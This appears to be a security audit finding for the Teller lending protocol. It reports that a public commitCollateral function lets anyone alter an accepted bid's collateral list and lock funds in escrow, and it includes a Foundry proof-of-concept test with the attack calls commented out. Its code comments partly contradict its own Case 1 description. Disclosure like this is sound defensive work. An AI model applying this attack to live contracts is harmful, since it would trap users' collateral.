Impact: high

Written with "scocoyash" Watson. 
Final reports can differ slightly.

## Summary
The `commitCollateral` function in CollateralManager is assigned the identifier **public**, so **anyone** can call this function for **any bid** present in the system. The CollateralManager maintains a list of collaterals for a loan in a list **_bidCollaterals**.
Even after a bid has been accepted and a loan has been granted to the receiver, an attacker can commit a new collateral of a Standard ERC implementation to the accepted bid. 
Although the borrower might have repaid a loan, it cannot withdraw the collateral because there is not enough "token" (from the collateral committed by attacker) in the escrow. 
Withdrawal is only possible when the borrower sends the same tokens as in the attack collateral to make the escrow actually owns the tokens and then withdraw using the function in CollateralManager.

## Vulnerability Detail

There are two cases in this:
1. The attacker submits the new collateral of the same token that the borrower has already committed previously, but with higher amount - in this case the previously submitted collateral entry in the list is overwritten by the new entry in the list.
2. The attacker submits the new collateral of another token which the borrower possesses so there is a new entry in the list maintained by the collateralManager - in this case a new entry might be appended to the list of collateral entries of the bid but the collateral is not added to escrow.

The following steps can break the withdrawal from liquidation functionality:

Case 1:
- The borrower submits a bid with a token (e.g., WethMock) as collateral, the lender accepts a bid.
- Since the bid is accepted, WethMock token is sent to an escrow at this stage ONLY.
- The borrower decides NOT to repay a loan (for various reasons) and decides to default but doesn't want the lender to withdraw from the escrow.
- The borrower calls `commitCollateral` to alter his original collateralBid and change the amount to 0 in the bid struct. [In this step, there is a checkBalance step where the CollateralManager checks if the borrower has enough balance of the collateral token, which it should have]
- Since the borrower didn't repay a loan, the collateral should be liquidated to the lender.
- The escrow is checked for withdrawal of each collateral in the **_bidCollaterals** list. There is this altered token information in the **_bidCollaterals** list in CollateralManager with amount 0, so even if the escrow has the Collateral, since the list has invalid value, no one can withdraw from the escrow until this value has been changed to original value.

Case 2:
- The borrower submits a bid with a token (e.g., WethMock) as collateral, the lender accepts a bid.
- Since the bid is accepted, WethMock token is sent to an escrow at this stage ONLY.
- The borrower decides NOT to repay a loan (for various reasons) and decides to default but doesn't want the lender to withdraw from the escrow.
- The borrower calls `commitCollateral` to alter his original collateralBid list and append a new collateral value to the list with a token that he might have at that moment. [In this step, there is a checkBalance step where the CollateralManager checks if the borrower has enough balance of the collateral token, which it should have]
- Since the borrower didn't repay a loan, the collateral should be liquidated to the lender.
- The escrow is checked for withdrawal of each collateral in the **_bidCollaterals** list. There is this token information present in the **_bidCollaterals** list in CollateralManager but the escrow does not have this token, since the list has invalid value, no one can withdraw from the escrow the original collateral as well until this value has been changed to original value.

This can be used to block withdrawal of any collateral by anyone, be it lender or borrower. The above is just an example of the borrower acting malicious. Even a 3rd party attacker can do this and block the withdrawals.

## POC

Run this test file from tests/ folder with the command:
`forge test --match-contract TestVuln' `

This test shall pass as the vulnerability is commented.
After uncommenting each case the vulnerable call, the test shall fail exactly at withdrawal phase.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Testable } from "./Testable.sol";
import { TellerV2 } from "../contracts/TellerV2.sol";
import { MarketRegistry } from "../contracts/MarketRegistry.sol";
import { ReputationManager } from "../contracts/ReputationManager.sol";

import "../contracts/interfaces/IMarketRegistry.sol";
import "../contracts/interfaces/IReputationManager.sol";

import "../contracts/EAS/TellerAS.sol";

import "../contracts/mock/WethMock.sol";
import "../contracts/interfaces/IWETH.sol";

import { User } from "./Test_Helpers.sol";

import "../contracts/escrow/CollateralEscrowV1.sol";
import "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import "../contracts/LenderCommitmentForwarder.sol";
import "./tokens/TestERC20Token.sol";

import "../contracts/CollateralManager.sol";
import { Collateral } from "../contracts/interfaces/escrow/ICollateralEscrowV1.sol";
import { PaymentType } from "../contracts/libraries/V2Calculations.sol";
import { BidState, Payment } from "../contracts/TellerV2Storage.sol";


import "../contracts/MetaForwarder.sol";
import { LenderManager } from "../contracts/LenderManager.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./tokens/TestERC20Token.sol";

import "lib/forge-std/src/console.sol";

contract TestVuln is Testable {

    TellerV2 tellerV2;

    TellerV2User private marketOwner;
    TellerV2User private borrower;
    TellerV2User private lender;

    CollateralManager collateralManager;
    CollateralEscrowV1 escrowImplementation;
    UpgradeableBeacon escrowBeacon;
    WethMock wethMock;
    TestERC20Token daiMock;

    uint256 marketId1;
    uint256 collateralAmount = 10;
    
    function setUp() public {
        // Deploy protocol
        tellerV2 = new TellerV2(address(0));

        escrowImplementation = new CollateralEscrowV1();
        collateralManager = new CollateralManager();
        escrowBeacon = new UpgradeableBeacon(address(escrowImplementation));

        // Deploy MarketRegistry & ReputationManager
        IMarketRegistry marketRegistry = IMarketRegistry(new MarketRegistry());
        
        IReputationManager reputationManager = IReputationManager(
            new ReputationManager()
        );
        reputationManager.initialize(address(tellerV2));
        
        collateralManager.initialize(address(escrowBeacon), address(tellerV2));
        wethMock = new WethMock();
        daiMock = new TestERC20Token("Dai", "DAI", 10000000, 18);
        
        MetaForwarder metaforwarder = new MetaForwarder();
        metaforwarder.initialize();
        LenderManager lenderManager = new LenderManager((marketRegistry));
        lenderManager.initialize();
        lenderManager.transferOwnership(address(tellerV2));

        // Deploy LenderCommitmentForwarder
        LenderCommitmentForwarder lenderCommitmentForwarder = new LenderCommitmentForwarder(
            address(tellerV2),
            address(marketRegistry)
        );

        tellerV2.initialize(
            50,
            address(marketRegistry),
            address(reputationManager),
            address(lenderCommitmentForwarder),
            address(collateralManager),
            address(lenderManager)
        );

        marketOwner = new TellerV2User(address(tellerV2), wethMock);
        borrower = new TellerV2User(address(tellerV2), wethMock);
        lender = new TellerV2User(address(tellerV2), wethMock);

        uint256 balance = 5000;
        payable(address(borrower)).transfer(balance);
        payable(address(lender)).transfer(balance * 10);
        
        borrower.depositToWeth(balance);
        lender.depositToWeth(balance * 10);

        daiMock.transfer(address(lender), balance * 10);
        daiMock.transfer(address(borrower), balance);
        // Approve Teller V2 for the lender's dai
        lender.addAllowance(address(daiMock), address(tellerV2), balance * 10);

        marketId1 = marketOwner.createMarket(
            address(marketRegistry),
            8000,
            7000,
            5000,
            500,
            false,
            false,
            PaymentType.EMI,
            PaymentCycleType.Seconds,
            "uri://"
        );
    }
    
    function submitCollateralBid(Collateral[] memory collateralInfo) public returns (uint256 bidId_) {
        
        uint256 bal = wethMock.balanceOf(address(borrower));
        // Increase allowance
        // Approve the collateral manager for the borrower's weth
        borrower.addAllowance(
            address(wethMock),
            address(collateralManager),
            collateralAmount
        );

        bidId_ = borrower.submitCollateralBid(
            address(daiMock),
            marketId1,
            100,
            10000,
            500,
            "metadataUri://",
            address(borrower),
            collateralInfo
        );
    }

    function acceptBid(uint256 _bidId) public {
        // Accept bid
        lender.acceptBid(_bidId);
    }

    function test_commit_collateral_and_withdraw_bug() public {
        Collateral memory info;
        info._amount = collateralAmount;
        info._tokenId = 0;
        info._collateralType = CollateralType.ERC20;
        info._collateralAddress = address(wethMock);

        Collateral[] memory collateralInfo = new Collateral[](1);
        collateralInfo[0] = info;

        // Submit bid as borrower
        uint256 bidId = submitCollateralBid(collateralInfo);
        // Accept bid as lender - state changes to Accepted
        acceptBid(bidId);

        // Get newly created escrow
        address escrowAddress = collateralManager._escrows(bidId);
        CollateralEscrowV1 escrow = CollateralEscrowV1(escrowAddress);

        uint256 storedBidId = escrow.getBid();
        // Test that the created escrow has the same bidId and collateral stored
        assertEq(bidId, storedBidId, "Collateral escrow was not created");

        uint256 escrowBalance = wethMock.balanceOf(escrowAddress);
        assertEq(collateralAmount, escrowBalance, "Collateral was not stored");

        console.log("Before Vul: ");
        console.log("Weth: ", wethMock.balanceOf(address(borrower)));
        console.log("Dai: ", daiMock.balanceOf(address(borrower)));
        console.log("Escrow Weth Balance: ", escrowBalance);
        
        // --------------------------------------------------------------------
        
        // VULN - anyone can still add collateral on behalf of the borrower
        // uncomment this to test vulnerability
       //  info._amount = collateralAmount*100;

        // If the token of new collateral is different with every token in the previous bid, the attack works.
        // However, to make this new collateral be committed successfully, borrower should have this amount of token.
        // Therefore, the attacker should send this amount of token before attack.
        // uncomment the next line to test CASE 2:
        // info._collateralAddress = address(daiMock);
        
        // If the token of new collateral is same with one in the previous bid, the attack does not work
        // because the escrow holds one collateral per one token.
         // uncomment the next line to test CASE 1:
        // info._collateralAddress = address(wethMock);
        
        // uncomment this to test vuln
        // collateralManager.commitCollateral(bidId, collateralInfo);
        
        // --------------------------------------------------------------------

        // repay loan
        uint256 borrowerBalanceBefore = wethMock.balanceOf(address(borrower));
        console.log("\nBefore repaying: ");
        console.log("Borrower weth: ", borrowerBalanceBefore);
        console.log("Borrower dai: ", daiMock.balanceOf(address(borrower)));
        Payment memory amountOwed = tellerV2.calculateAmountOwed(bidId);
        borrower.addAllowance(
            address(daiMock),
            address(tellerV2),
            amountOwed.principal + amountOwed.interest
        );
        borrower.repayLoanFull(bidId);

        // Check borrower balance for collateral
        uint256 borrowerBalanceAfter = wethMock.balanceOf(address(borrower));
        console.log("\nAfter repaying: ");
        console.log("Borrower weth: ", borrowerBalanceAfter);
        console.log("Borrower dai: ", daiMock.balanceOf(address(borrower)));
        assertEq(
            collateralAmount,
            borrowerBalanceAfter - borrowerBalanceBefore,
            "Collateral was not sent to borrower after repayment"
        );
    }

}

contract TellerV2User is User {
    WethMock public immutable wethMock;

    constructor(address _tellerV2, WethMock _wethMock) User(_tellerV2) {
        wethMock = _wethMock;
    }

    function depositToWeth(uint256 amount) public {
        wethMock.deposit{ value: amount }();
    }
}
```

## Impact
Committing a collateral to a bid is broken and funds are trapped in the escrow.
No one can withdraw the collaterals until the values in the **_bidCollaterals** is fixed.

## Code Snippet

[Withdrawal code which loops over all the collaterals](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L388-L419)

## Tool used
Manual Review, Foundry Test

## Recommendation
- check whether the committed collaterals and the information of collaterals in escrow are the same - if it is not same, the newly committed collateral should be removed from the collateral manager.
- validate the state of the bid before committing collateral - only bids in PENDING state should be allowed to submit collaterals
